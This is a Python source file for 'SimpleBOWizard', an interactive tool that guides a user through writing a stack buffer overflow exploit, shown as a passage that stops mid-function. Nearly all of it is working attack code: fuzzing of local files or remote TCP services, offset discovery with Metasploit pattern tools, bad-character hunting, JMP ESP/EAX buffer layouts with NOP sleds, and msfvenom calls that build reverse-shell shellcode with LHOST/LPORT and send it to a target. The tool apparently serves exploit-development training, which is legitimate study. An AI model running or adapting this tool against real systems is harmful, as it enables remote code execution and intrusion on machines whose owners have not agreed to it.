#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
# The SimpleBOWizard guides through all steps required for a simple buffer
# overflow. The user can enter all required information step by step.
# Based on this, the exploit file will be created and updated.
# =============================================================================
# Author  : nosce
# Date    : January 2020
# License : MIT
# Status  : Prototype
# =============================================================================

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------
from concurrent.futures import ThreadPoolExecutor
import struct
import sys
import time
import os
import re
import shlex
import shutil
import socket as so
import subprocess as sub
from binascii import unhexlify
from fileinput import FileInput

# -----------------------------------------------------------------------------
# Global variables and constants
# -----------------------------------------------------------------------------
_DEFAULT_POOL = ThreadPoolExecutor()
# Formatting for messages
BOLD = '\033[1m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[31m'
GRAY = '\033[37m'
CYAN = '\033[36m'
FORMAT_END = '\033[0m'

# Global
bo_type = 'local'
current_step = -1
buffer = b''
# Local BO
file_ext = 'py'
file_name = 'exploit'
file = file_name + '.' + file_ext if file_ext else file_name
# Remote BO
target = '127.0.0.1'
port = 80
start_command = b''
end_command = b''
# Fuzzing
fuzz_buffer = []
fuzz_buff_length = 30
fuzz_char = b'A'
increase_step = 200
# Pattern
pattern_length = 2000
# Buffer
buf_length = 2000
offset = 1000
badchars = []
nop_sled = 24
nop_padding = 24
return_address = struct.pack('<L', 0x12345678)
# Payload
arch = 'x86'
platform = 'windows'
payload = 'windows/messagebox'
connect_ip = '127.0.0.1'
connect_port = 4444
payload_code = b''

char_string = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
char_string += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
char_string += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
char_string += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
char_string += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
char_string += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
char_string += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
char_string += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
char_string += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
char_string += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
char_string += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
char_string += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
char_string += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
char_string += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
char_string += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
char_string += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


# -----------------------------------------------------------------------------
# Buffer types
# -----------------------------------------------------------------------------
class GenericBuffer:
	"""
	Basic Buffer sending an A-B-C payload, e.g for testing offsets
	"""
	number = 0
	description = 'Simple A-B-C buffer'
	select_text = 'None of these'
	payload_size = buf_length - offset - 4 - len(start_command) - len(end_command)

	def get_buffer(self):
		global buffer
		buffer = start_command
		buffer += b"A" * offset  # Overflow
		buffer += b"B" * 4  # EIP content
		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
		buffer += end_command

	def get_input(self):
		print_error('Sorry! In this case the wizard cannot build the right buffer automatically. '
					'Please use the raw exploit file and modify it to your needs manually.')


class ESPBuffer:
	"""
	Buffer which contains the payload after the return address. A JMP ESP command should be used as return address.
	"""
	number = 1
	description = 'Buffer with payload in stack and JMP ESP'
	select_text = 'The Top of Stack and following memory has been overwritten with Cs (ESP points to Cs)'
	payload_size = buf_length - len(start_command) - offset - 4 - nop_sled - len(end_command)

	def get_buffer(self):
		global buffer
		buffer = start_command
		buffer += b"A" * offset
		buffer += return_address
		buffer += b'\x90' * nop_sled
		buffer += payload_code
		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
		buffer += end_command
		if len(buffer) > buf_length:
			print_warning('The buffer with payload is larger than the originally defined buffer length. '
						  'Check whether the exploit still runs properly.')

	def get_input(self):
		print_info('Use the debugger to search for a JMP ESP address (e.g. Immunity Debugger: !mona jmp -r ESP)')
		print_warning('Take care that the address does not contain a bad characters (such as 00)')
		show_prompt_text('Enter a JMP ESP address:')
		user_input = get_input(address_valid)
		global return_address
		return_address = struct.pack('<L', int(user_input, 16))


class EAXBuffer:
	"""
	Buffer which contains the payload before the return address. Should be used if EAX points to first part of buffer.
	A JMP EAX command should be used as payload.
	"""
	number = 2
	description = 'Buffer with payload in EAX and JMP EAX'
	select_text = 'The Top of Stack has not been overwritten; EAX points to As'
	payload_size = offset - nop_sled - nop_padding

	def get_buffer(self):
		global buffer
		buffer = start_command
		buffer += b'\x90' * nop_sled
		buffer += payload_code
		buffer += b'\x90' * (offset - len(buffer))
		buffer += return_address
		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
		buffer += end_command
		if len(buffer) > buf_length:
			print_warning('The buffer with payload is larger than the originally defined buffer length. '
						  'Check whether the exploit still runs properly.')

	def get_input(self):
		print_info('Use the debugger to search for a JMP EAX address (e.g. Immunity Debugger: !mona jmp -r EAX)')
		print_warning('Take care that the address does not contain a bad characters (such as 00)')
		show_prompt_text('Enter a JMP EAX address:')
		user_input = get_input(address_valid)
		global return_address
		return_address = struct.pack('<L', int(user_input, 16))


class FixedAddressBuffer:
	"""
	Buffer which contains the payload before the return address. Expects a fixed address which points to payload.
	"""
	number = 3
	description = 'Buffer with payload before EIP and pointer to fixed address'
	select_text = 'The Top of Stack has not been overwritten but contains a fixed address which points to As'
	payload_size = offset - nop_sled - nop_padding

	def get_buffer(self):
		global buffer
		buffer = start_command
		buffer += b'\x90' * nop_sled
		buffer += payload_code
		buffer += b'\x90' * (offset - len(buffer))
		buffer += return_address
		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
		buffer += end_command
		if len(buffer) > buf_length:
			print_warning('The buffer with payload is larger than the originally defined buffer length. '
						  'Check whether the exploit still runs properly.')

	def get_input(self):
		show_prompt_text('Enter the address shown in the Top of Stack:')
		user_input = get_input(address_valid)
		global return_address
		return_address = struct.pack('<L', int(user_input, 16))


class BadCharCBuffer:
	"""
	Buffer which contains all ASCII characters after the return address
	"""
	number = 4
	description = 'Buffer with bad chars after EIP (in Cs)'
	select_text = 'Enough space in stack for payload'

	def get_buffer(self):
		global buffer
		buffer = start_command
		buffer += b"A" * offset
		buffer += b"B" * 4
		buffer += char_string
		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
		buffer += end_command
		if len(buffer) > buf_length:
			print_warning('The buffer with all ascii characters is larger than the originally defined buffer length. '
						  'Check whether the exploit still runs properly.')


class BadCharABuffer:
	"""
	Buffer which contains all ASCII characters before the return address
	"""
	number = 4
	description = 'Buffer with bad chars before EIP (in As)'
	select_text = 'Not enough space in stack for payload'

	def get_buffer(self):
		global buffer
		buffer = start_command
		buffer += b"A" * nop_sled
		buffer += char_string
		buffer += b"A" * (offset - len(buffer))
		buffer += b"B" * 4
		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
		buffer += end_command
		if len(buffer) > buf_length:
			print_warning('The buffer with all ascii characters is greater than the originally defined buffer length. '
						  'Check whether the exploit still runs properly.')


selected_buffer = 0
bad_char_buffer = BadCharCBuffer()
buf_types = [GenericBuffer(), ESPBuffer(), EAXBuffer(), FixedAddressBuffer()]


# -----------------------------------------------------------------------------
# Descriptions of all parameters
# -----------------------------------------------------------------------------
# Returns lists with: parameter name, value, required, description

def desc_bo_type():
	return ['type', bo_type, 'yes',
			'Type of buffer overflow: local or remote']


def desc_step():
	return ['step', current_step, 'yes',
			'Currently selected wizard step']


def desc_file():
	global file
	file = file_name + '.' + file_ext if file_ext else file_name
	return ['file', file, 'yes',
			'File name; to change set the filename and file_ext parameters']


def desc_file_name():
	return ['filename', file_name, 'yes' if bo_type is 'local' else 'no',
			'Name of exploit file']


def desc_file_ext():
	return ['fileext', file_ext, 'yes' if bo_type is 'local' else 'no',
			'Extension of exploit file']


def desc_target():
	return ['target', target, 'yes' if bo_type is 'remote' else 'no',
			'IP of target system']


def desc_port():
	return ['port', port, 'yes' if bo_type is 'remote' else 'no',
			'Port on which application runs of target system']


def desc_start_command():
	return ['command', str(start_command), 'no',
			'Command which needs to be placed before calling the payload. '
			'Enter with: set command "command". For raw ASCII input use: set command b"command". '
			'Leave empty if not required']


def desc_end_command():
	return ['end_command', str(end_command), 'no',
			'Command which needs to be placed after calling the payload. '
			'Enter with: set end_command "command". For raw ASCII input use: set command b"command". '
			'Leave empty if not required']


def desc_fuzz_buff_length():
	return ['fuzz_length', fuzz_buff_length, 'yes',
			'How many payloads with increasing length will be created for fuzzing']


def desc_increase_step():
	return ['fuzz_increase', increase_step, 'yes',
			'How much the payload will be increased on each step']


def desc_fuzz_char():
	return ['fuzz_char', fuzz_char.decode(), 'yes',
			'Which character will be used for fuzzing the buffer']


def desc_pattern():
	return ['pattern', pattern_length, 'yes',
			'Length of alphanumeric pattern which will be generated.']


def desc_buf_length():
	return ['buffer_length', buf_length, 'yes',
			'Total length of buffer']


def desc_offset():
	return ['offset', offset, 'yes',
			'Offset for EIP overwrite']


def desc_badchars():
	return ['badchars', ', '.join(c for c in badchars), 'yes',
			'Which characters are not allowed in the buffer']


def desc_nop_sled():
	return ['nop_sled', nop_sled, 'yes',
			'Size of NOP sled before payload']


def desc_nop_padding():
	return ['nop_padding', nop_padding, 'yes',
			'Size of NOP padding after payload']


def desc_return_address():
	return ['return', format(struct.unpack('<L', return_address)[0], 'x'), 'yes',
			'Memory address to return to (e.g. JMP ESP address)']


def desc_arch():
	return ['arch', arch, 'yes',
			'Architecture of target system: 86 or 64']


def desc_platform():
	return ['platform', platform, 'yes',
			'Operating system or platform of target']


def desc_payload():
	return ['payload', payload, 'yes',
			'Type of payload. See msfvenom for possible options: msfvenom -l payloads']


def desc_connect_ip():
	return ['lhost', connect_ip, 'yes' if bo_type is 'remote' else 'no',
			'IP to connect to, e.g. with reverse shell']


def desc_connect_port():
	return ['lport', connect_port, 'yes' if bo_type is 'remote' else 'no',
			'Port to connect to, e.g. with reverse shell']


# -----------------------------------------------------------------------------
# Start
# -----------------------------------------------------------------------------
def check_dependencies():
	"""
	Checks if all required binaries are available
	:return: (boolean) True if all dependencies fulfilled
	"""
	dependencies = ['msf-pattern_create', 'msf-pattern_offset', 'msfvenom']
	deps_ok = True
	for dep in dependencies:
		try:
			sub.call(dep, stdout=sub.DEVNULL, stderr=sub.DEVNULL)
		except OSError:
			deps_ok = False
			print_error('Missing binary: {}'.format(dep))
	if not deps_ok:
		print_info('You need to install the Metasploit Framework')
	return deps_ok


def print_welcome():
	"""
	Prints a welcome message to the screen
	"""
	print('''{}
         ╔═╗┬┌┬┐┌─┐┬  ┌─┐
         ╚═╗││││├─┘│  ├┤ 
         ╚═╝┴┴ ┴┴  ┴─┘└─┘

         ▄▄▄▄    ▒█████
        ▓█████▄ ▒██▒  ██▒
        ▒██▒ ▄██▒██░  ██▒
        ▒██░█▀  ▒██   ██░
        ░▓█  ▀█▓░ ████▓▒░
        ░▒▓███▀▒░ ▒░▒░▒░
        ▒░▒   ░   ░ ▒ ▒░
         ░    ░ ░ ░ ░ ▒         *
         ░          ░ ░        *°
                              *°`
         ╦ ╦┬┌─┐┌─┐┬─┐┌┬┐     *°``
         ║║║│┌─┘├─┤├┬┘ ││  (´***°``)
         ╚╩╝┴└─┘┴ ┴┴└──┴┘   ```*´´´
   This wizards helps you getting
started with simple buffer overflows.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{}
'''.format(CYAN, FORMAT_END))


def select_bo_type():
	"""
	Prints the buffer overflow types to the screen and stores the users selection
	"""
	show_prompt_text('Select type of buffer overflow:')
	show_prompt_text('[ L ] Local buffer overflow', False)
	show_prompt_text('     {} = Open a malicious file in an application {}'.format(GRAY, FORMAT_END), False)
	show_prompt_text('[ R ] Remote buffer overflow', False)
	show_prompt_text('     {} = Send a malicious request via TCP to an application {}'.format(GRAY, FORMAT_END), False)
	user_input = get_input(bo_type_valid)
	global bo_type
	bo_type = 'local' if user_input in ['l', 'loc', 'local'] else 'remote'


# -----------------------------------------------------------------------------
# Steps
# -----------------------------------------------------------------------------
def start_steps():
	"""Starts the wizard steps, beginning with fuzzing"""
	step_fuzzing()


def step_fuzzing():
	"""
	We will increasing payloads and send them to the application to find out at which length a buffer overflow occurs
	"""
	global current_step
	current_step = 0
	show_step_banner('[0] Fuzzing')
	if bo_type == 'local':
		# File extension
		show_prompt_text('Enter file extension:')
		user_input = get_input(ext_valid)
		global file_ext
		global file
		file_ext = user_input
		file = file_name + '.' + file_ext if file_ext else file_name
		print('\n{} files with increasing size will be generated. The following settings will be used:\n'.format(
			fuzz_buff_length))
		settings = [desc_file_ext(), desc_fuzz_buff_length(), desc_fuzz_char(), desc_increase_step(),
					desc_start_command(), desc_end_command()]
	elif bo_type == 'remote':
		# Target IP
		show_prompt_text('Enter target IP:')
		user_input = get_input(ip_valid)
		global target
		target = user_input
		# Target port
		show_prompt_text('Enter target port:')
		user_input = get_input(port_valid)
		global port
		port = int(user_input)
		print('\nA fuzzing file will be generated. The following settings will be used:\n')
		settings = [desc_target(), desc_port(), desc_fuzz_buff_length(), desc_fuzz_char(),
					desc_increase_step(), desc_start_command(), desc_end_command()]
	# Optional: file name, buffer length, increase, start command
	show_settings(settings)
	if proceed_ok():
		if bo_type == 'local':
			dump_local_fuzz()
		elif bo_type == 'remote':
			dump_remote_fuzz()
			run_remote_fuzzing()
	# Proceed
	step_pattern()


def step_pattern():
	"""
	Based on the buffer length determined through fuzzing (previous step), we will create and send
	a unique pattern which will help us finding the offset
	"""
	global current_step
	current_step = 1
	show_step_banner('[1] Finding offset')
	# Get length from fuzzing
	show_prompt_text('Enter the length at which the application/service crashed:')
	user_input = get_input(number_valid)
	global pattern_length
	pattern_length = int(user_input) - len(start_command) - len(end_command)
	global buf_length
	buf_length = int(user_input)
	# Call Metasploit framework
	tmp_file = 'pattern.txt'
	command = 'msf-pattern_create -l {} > {}'.format(pattern_length, tmp_file)
	thread = call_command(command)
	while thread.running():
		animation('Creating pattern')
	# Proceed if pattern creation was successful
	if thread.result() == 0:
		print()
		with open(tmp_file, 'r') as f:
			# Buffer ----------------------------------
			global buffer
			buffer = start_command
			buffer += f.read().splitlines()[0].encode()
			buffer += end_command
		# -----------------------------------------
		os.unlink(tmp_file)
		print('The exploit file will be generated. The following settings will be used:\n')
		if bo_type == 'local':
			settings = [desc_pattern(), desc_start_command(), desc_end_command()]
			show_settings(settings)
			if proceed_ok():
				dump_local_exploit()
				print(' Load file into vulnerable application and check which pattern is shown in EIP on crash.')
		elif bo_type == 'remote':
			settings = [desc_target(), desc_port(), desc_pattern(), desc_start_command(), desc_end_command()]
			show_settings(settings)
			if proceed_ok():
				dump_remote_exploit()
			run_remote_exploit()
	# Proceed
	step_offsets()


def step_offsets():
	"""
	In the offset step, the user enters the value that overwrites EIP.
	By comparing this value to the pattern (previous step), the offset can be determined.
	We will then build a custom payload that places Bs in the EIP.
	The user must then check in the debugger whether the offset has been calculated properly.
	"""
	global current_step
	current_step = 2
	show_step_banner('[2] Checking offsets')
	# Get EIP offset from pattern -----------------------------------------------
	show_prompt_text('Enter the 8 characters that are shown in the EIP:')
	user_input = get_input(pattern_valid)
	# Call Metasploit framework
	tmp_file = 'offset.txt'
	command = 'msf-pattern_offset -q {} > {}'.format(shlex.quote(user_input), tmp_file)
	thread = call_command(command)
	while thread.running():
		animation('Finding offset')
	# Proceed if finding offset was successful
	if thread.result() == 0:
		print()
		with open(tmp_file, 'r') as f:
			result = f.read()
			try:
				global offset
				offset = int(result.split(' ')[-1])
				print_info('Offset at ' + str(offset))
			except (ValueError, IndexError):
				print_error('Could not find string in pattern. Maybe the exploit did not work?')
				print_info('You could return to step [1] and try increasing the length.')
				os.unlink(tmp_file)
				valid_step = False
				while not valid_step:
					show_prompt_text('With which step do you want to proceed?')
					user_input = get_input(number_valid)
					if set_step(user_input):
						valid_step = True
		os.unlink(tmp_file)
		# Get stack (ESP) offset from pattern ---------------------------------------
		show_prompt_text('Enter the 8 characters that are shown at the top of stack:')
		user_input = get_input(pattern_valid)
		# Call Metasploit framework
		tmp_file = 'offset.txt'
		command = 'msf-pattern_offset -q {} > {}'.format(shlex.quote(user_input), tmp_file)
		thread = call_command(command)
		while thread.running():
			animation('Finding offset')
		# Proceed if finding offset was successful
		if thread.result() == 0:
			print()
			with open(tmp_file, 'r') as f:
				result = f.read()
				try:
					stack_offset = int(result.split(' ')[-1])
					print_info('Offset at ' + str(stack_offset))
					global nop_sled
					off_stack_dist = stack_offset - offset
					if off_stack_dist > nop_sled:
						nop_sled = off_stack_dist
				except (ValueError, IndexError):
					print_info('Could not find string in pattern. '
							   'Seems that the overflow did not overwrite the stack. We will deal with that later.')
		os.unlink(tmp_file)
		# Create check file ---------------------------------------
		buf_types[0].get_buffer()
		if bo_type == 'local':
			dump_local_exploit()
		elif bo_type == 'remote':
			update_remote_exploit()
			run_remote_exploit()
		print(
			' Does the EIP show 42424242? If not, something is wrong with the offset and you should repeat the previous steps.')
		print_info('Write the address down where the Cs start. You can use it later to find bad characters with mona.')
		# Proceed
		if proceed_ok():
			step_badchars()


def step_badchars():
	"""
	In the badchar step an ASCII string is repeatedly passed as payload.
	The user has to examine the result in a debugger and enter the characters that break the exploit.
	These characters are stored and will be considered later when creating the real payload.
	"""
	global current_step
	current_step = 3
	show_step_banner('[3] Finding bad characters')
	print_info('You must probably repeat this step multiple times until you have found all bad characters.')
	# Mona info
	print('''{}
	In Immunity Debugger, you can use mona to find the bad characters. To do so, do the following before running the exploit:
	1. Set up working directory:  !mona config -set workingfolder c:\\mona\\%p
	2. Create byte array:         !mona bytearray
	{}'''.format(GRAY, FORMAT_END))
	all_chars_found = False
	while not all_chars_found:
		bad_char_buffer.get_buffer()
		if bo_type == 'local':
			dump_local_exploit()
		elif bo_type == 'remote':
			update_remote_exploit()
			run_remote_exploit()
		print('\n Can you see all Cs when following ESP or EAX in dump (depending on where the Cs are stored)?')
		print('''{}
		In Immunity Debugger, you can use mona to find the bad characters. 
		To do so, do the following before resending the exploit:
		1. Compare:              !mona compare -f c:\\mona\\<app name>\\bytearray.bin -a <address where Cs should start>
		2. Recreate byte array:  !mona bytearray -cpb "{}<new_bad_char>"
		{}'''.format(GRAY, '\\x' + '\\x'.join(c for c in badchars), FORMAT_END))
		show_prompt_text('Enter the character (e.g. 00, 0a, 0d) which does not show up or breaks the exploit')
		show_prompt_text('To show all possible ascii characters enter {}show ascii{}'.format(BOLD, FORMAT_END))
		show_prompt_text('Leave empty / press Enter when there a no more bad characters.')
		user_input = get_input(bad_char_valid)
		if user_input == '':
			all_chars_found = True
		else:
			# Remove from badchar string
			char = unhexlify(user_input)
			global char_string
			char_string = char_string.replace(char, b'')
			# Append to list of bad chars
			badchars.append(user_input)
	# Proceed
	step_return()


def step_return():
	"""
	By examining the buffer overflow, we can determine where to put the payload and which command to use to access it
	"""
	global current_step
	current_step = 4
	show_step_banner('[4] Finding return address')
	show_prompt_text('Examine the buffer overflow in the debugger. Which case does apply?')
	for b in buf_types:
		show_prompt_text('[ ' + str(b.number) + ' ] ' + b.select_text, False)
	# Wait for user selection
	while True:
		user_input = int(get_input(number_valid))
		if 0 <= user_input < len(buf_types):
			break
		print_warning('The number you entered is invalid')
	# Handle selected buffer type
	for b in buf_types:
		if b.number == user_input:
			b.get_input()
			b.get_buffer()
			global selected_buffer
			selected_buffer = user_input
	if bo_type == 'local':
		dump_local_exploit()
	elif bo_type == 'remote':
		update_remote_exploit()
		run_remote_exploit()
	# Proceed
	print(' Check if everything is where it should be. If not, repeat previous steps.')
	if proceed_ok():
		step_payload()


def step_payload():
	"""
	We define the type of payload we wish to send and create the final exploit file.
	"""
	global current_step
	current_step = 5
	show_step_banner('[5] Creating payload')
	# Set IP -----------------
	global connect_ip
	show_prompt_text('Enter your IP (hit Enter to use current value {}):'.format(connect_ip))
	user_input = get_input(ip_valid)
	if user_input != '':
		connect_ip = user_input
	# Set port -----------------
	global connect_port
	show_prompt_text('Enter the port to listen on (hit Enter to use current value {}):'.format(connect_port))
	user_input = get_input(port_valid)
	if user_input != '':
		connect_port = user_input
	# Set architecture -----------------
	global arch
	show_prompt_text('Enter the target architecture (hit Enter to use current value {}):'.format(arch))
	user_input = get_input(arch_valid)
	if user_input != '':
		arch = 'x' + user_input
	# Set platform -----------------
	global platform
	show_prompt_text('Enter the target platform (hit Enter to use current value {}):'.format(platform))
	user_input = get_input(platform_valid)
	if user_input != '':
		platform = user_input
	# Set payload -----------------
	global payload
	while True:
		show_prompt_text('Enter payload type'.format(payload))
		show_prompt_text('Show all available with {}show payloads{}'.format(BOLD, FORMAT_END))
		user_input = get_input(payload_valid)
		if user_input == 'show payloads':
			show_payloads()
			continue
		else:
			# Create payload -----------------
			payload = user_input
			payload_ok = create_payload()
			if payload_ok and bo_type == 'local':
				dump_local_exploit()
			elif payload_ok and bo_type == 'remote':
				update_remote_exploit()
				run_remote_exploit()
			show_prompt_text('Did your exploit work? If not, try sending a different payload.')
			show_prompt_text(
				'Enter {}again{} to try again. Hit Enter if everything worked fine.'.format(BOLD, FORMAT_END))
			user_input = get_input(check_text)
			if user_input == '':
				break
			else:
				continue
	# Finally show prompt till user exits
	get_input(generic_check)


def create_payload():
	"""Creates a palyoad with msfvenom and updates the buffer"""
	tmp_file = 'payload.py'
	payload_size = buf_types[selected_buffer].payload_size
	command = "msfvenom -a {arch} --platform {plat} -p {pay} LHOST={host} LPORT={port} EXITFUNC=thread -s {size} -b '{bad}' -f py -v payld -o {file}".format(
		arch=shlex.quote(arch),
		plat=shlex.quote(platform),
		pay=shlex.quote(payload),
		host=connect_ip,
		port=connect_port,
		size=payload_size,
		bad='\\x' + '\\x'.join(str(char) for char in badchars),
		file=tmp_file)
	print_info("Executing command: " + command)
	thread = call_command(command)
	while thread.running():
		animation('Creating payload')
	# Proceed if finding offset was successful
	if thread.result() == 0:
		print()
		from payload import payld
		global payload_code
		payload_code = payld
		# Remove temporary file and folder
		os.unlink(tmp_file)
		shutil.rmtree('__pycache__', ignore_errors=True)
		# Update buffer with payload
		buf_types[selected_buffer].get_buffer()
		print_info('Buffer has been updated with new payload')
		if len(payload_code) > payload_size:
			print_warning(
				"The payload was generated as small as possible. However, it is larger than the specified payload size.\n"
				"The exploit probably still works fine, but don't be surprised if problems occur.")
		return True
	else:
		print('\n')
		print_warning('Something went wrong when creating the payload. Check if you have entered a valid payload.')
		print_info('To create a new payload use {}set payload <value>{}'.format(BOLD, FORMAT_END))
		return False


# -----------------------------------------------------------------------------
# Input check functions
# -----------------------------------------------------------------------------
# Checks whether the user input is valid in the given context
# Returns True if input is valid
# -----------------------------------------------------------------------------

def intro_valid(user_input):
	if user_input == 'start':
		return True
	return False


def bo_type_valid(user_input):
	"""Accepts certain string variants for local / remote"""
	if user_input in ['l', 'r', 'loc', 'rem', 'local', 'remote']:
		return True
	return False


def ext_valid(user_input):
	"""Accepts a string with a maximum length of 20 as file extension"""
	if user_input.startswith('.') or len(user_input) > 20 or ' ' in user_input:
		return False
	return True


def ip_valid(user_input):
	"""Accepts a string with a valid IP address"""
	if user_input == '':
		return True
	ip_regex = re.compile(
		r'^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$')
	return re.match(ip_regex, user_input)


def port_valid(user_input):
	"""Accepts an integer within the number range for ports"""
	if user_input == '':
		return True
	try:
		port_no = int(user_input)
		if 0 <= port_no <= 65535:
			return True
		else:
			return False
	except ValueError:
		return False


def check_enter(user_input):
	"""Accepts no input (= Enter) and skip"""
	if user_input in ['', 'skip']:
		return True
	return False


def number_valid(user_input):
	"""Accepts any integer"""
	try:
		number = int(user_input)
		return True
	except ValueError:
		return False


def pattern_valid(user_input):
	"""The Metasploit pattern is alphanumeric, so the EIP value as well"""
	if len(user_input) == 8 and user_input.isalnum():
		return True
	return False


def bad_char_valid(user_input):
	"""Accepts an alphanumeric value of length 2 or no input (= Enter)"""
	if user_input == '':
		return True
	if len(user_input) == 2 and user_input.isalnum():
		try:
			int(user_input, 16)
			return True
		except ValueError:
			return False
	return False


def address_valid(user_input):
	"""Accepts a memory location: 8-bit hex value"""
	if len(user_input) == 8:
		try:
			int(user_input, 16)
			return True
		except ValueError:
			return False
	return False


def payload_valid(user_input):
	"""Accepts a string matching the basic format 'platform/payload'"""
	if len(user_input.split('/')) >= 2 or user_input == 'show payloads' or user_input == '':
		return True
	return False


def arch_valid(user_input):
	if user_input in ['64', '86', '']:
		return True
	return False


def platform_valid(user_input):
	"""Msfvenom platforms are words with a maximum length of 10"""
	if (len(user_input) <= 10 and user_input.isalpha()) or user_input == '':
		return True
	return False


def check_text(user_input):
	"""Accepts any string without numbers or special characters"""
	if user_input.isalpha() or user_input == '':
		return True
	return False


def generic_check(user_input):
	"""Always returns False so that the user prompt is shown until exit is entered"""
	return False


# -----------------------------------------------------------------------------
# Input handling
# -----------------------------------------------------------------------------
def get_input(check_function):
	"""
	Shows a prompt as long as the user has not entered valid input. A check function checks if the user input is valid.
	:param check_function: (function) Checks if input is valid
	:return: (string) User input in lower case
	"""
	input_ok = False
	user_input = ''
	while not input_ok:
		user_input = input(show_prompt())
		# Handle specific user input
		if user_input.lower() in ['exit', 'quit']:
			exit(0)
		elif user_input.lower() in ['help', 'show help']:
			show_help()
			continue
		elif user_input.lower() == 'show options':
			show_options()
			continue
		elif user_input.lower() == 'show steps':
			show_steps()
			continue
		elif user_input.lower() == 'show payloads':
			show_payloads()
			continue
		elif user_input.lower() == 'show ascii':
			show_ascii()
			continue
		elif user_input.lower().startswith('set '):
			set_option(user_input)
			continue
		elif user_input.lower() in ['dump', 'dump exploit', 'exploit']:
			if bo_type == 'local':
				dump_local_exploit()
			if bo_type == 'remote':
				dump_remote_exploit()
			continue
		# Check input
		input_ok = check_function(user_input.lower())
		if not input_ok:
			# Show message only if user entered something invalid
			if user_input != '':
				print_error('Invalid input. Type help to show available commands.')
	return user_input


def proceed_ok():
	"""
	Requires the user to hit enter to proceed
	"""
	show_prompt_text('Press Enter to proceed.')
	if get_input(check_enter) == '':
		return True
	return False


def set_option(user_input):
	"""
	Sets a parameter to given value based on the user input
	:param user_input: Command with format: set parameter value
	"""
	global start_command
	global pattern_length
	global end_command
	text = user_input.split(' ')
	if len(text) < 3 and (text[2] != 'command' or text[2] != 'badchars'):
		print_error('Invalid input. Use the following command format to set parameters: set parameter value')
		return
	parameter = text[1]
	value = text[2]
	if parameter == 'step':
		set_step(value)
	elif parameter == 'command':
		value = user_input.split(' ')[2:]
		command = ' '.join(v for v in value)
		# Handle binary input differently
		if command.startswith('b"'):
			command = command.lstrip('b"')
			command = command.rstrip('"')
			raw = ''.join(c for c in command.split('\\x'))
			start_command = unhexlify(raw)
		else:
			command = command.lstrip('"')
			command = command.rstrip('"')
			start_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
		# Recalc pattern length
		pattern_length = pattern_length - len(start_command) - len(end_command)
	elif parameter == 'end_command':
		value = user_input.split(' ')[2:]
		command = ' '.join(v for v in value)
		# Handle binary input differently
		if command.startswith('b"'):
			command = command.lstrip('b"')
			command = command.rstrip('"')
			raw = ''.join(c for c in command.split('\\x'))
			end_command = unhexlify(raw)
		else:
			command = command.lstrip('"')
			command = command.rstrip('"')
			end_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
		# Recalc pattern length
		pattern_length = pattern_length - len(start_command) - len(end_command)
	elif parameter == 'badchars':
		value = user_input.split(' ')[2:]
		global badchars
		badchars.clear()
		for v in value:
			if bad_char_valid(v):
				badchars.append(v)
			else:
				print_error('Could not add {} to bad characters: Invalid value'.format(v))
		print(badchars)
	elif parameter == 'type':
		if bo_type_valid(value):
			global bo_type
			bo_type = value
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'filename':
		global file_name
		file_name = value
	elif parameter == 'fileext':
		if ext_valid(value):
			global file_ext
			file_ext = value
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'target':
		if ip_valid(value):
			global target
			target = value
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'lhost':
		if ip_valid(value):
			global connect_ip
			connect_ip = value
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'port':
		if port_valid(value):
			global port
			port = value
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'lport':
		if port_valid(value):
			global connect_port
			connect_port = value
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'fuzz_length':
		if number_valid(value):
			global fuzz_buff_length
			fuzz_buff_length = int(value)
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'fuzz_increase':
